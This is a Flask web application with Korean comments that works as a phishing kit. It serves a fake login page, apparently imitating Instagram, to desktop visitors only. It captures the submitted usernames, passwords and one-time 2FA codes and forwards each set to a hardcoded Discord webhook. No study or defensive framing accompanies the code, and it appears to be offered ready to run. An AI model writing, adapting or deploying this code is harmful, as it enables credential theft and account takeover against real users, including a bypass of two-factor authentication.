from flask import Flask, render_template, request, session, redirect
import requests

app = Flask(__name__)
app.secret_key = "insta_stealth_final"

# 수신용 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 모바일 기기 판단 함수
def is_mobile():
    user_agent = request.headers.get('User-Agent', '')
    mobile_keywords = ["Mobile", "Android", "iPhone", "iPad", "Windows Phone"]
    return any(keyword in user_agent for keyword in mobile_keywords)

@app.route('/')
def index():
    if is_mobile():
        # 모바일 접속 시 다크모드 안내 페이지로 이동
        return render_template('pc_only.html')
    # PC 접속 시 가짜 로그인 페이지로 이동
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if is_mobile(): return render_template('pc_only.html')
    
    uid = request.form.get('username')
    pw = request.form.get('password')
    session['uid'] = uid
    requests.post(WEBHOOK_URL, json={"content": f"🚨 **수집 정보 (PC)**\nID: `{uid}`\nPW: `{pw}`"})
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp_code')
    uid = session.get('uid', 'Unknown')
    requests.post(WEBHOOK_URL, json={"content": f"🔑 **코드: {otp}** (유저: {uid})"})
    return render_template('success.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
